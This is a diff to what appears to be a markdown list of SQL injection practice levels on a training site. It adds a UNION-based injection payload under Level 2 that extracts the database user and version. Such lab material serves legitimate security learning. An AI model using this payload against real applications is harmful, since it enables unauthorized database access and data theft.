@@ -20,6 +20,8 @@
 | [Level 2](http://www.zixem.altervista.org/SQLi/level2.php?showprofile=4) | Easy |
 | ------- | ---------- |
 
+ `showprofile=-9999' union select user(),version(),3,4 -- -`
+
 | [Level 3](http://www.zixem.altervista.org/SQLi/level3.php?item=3) | Medium |
 | ------- | ---------- |
 
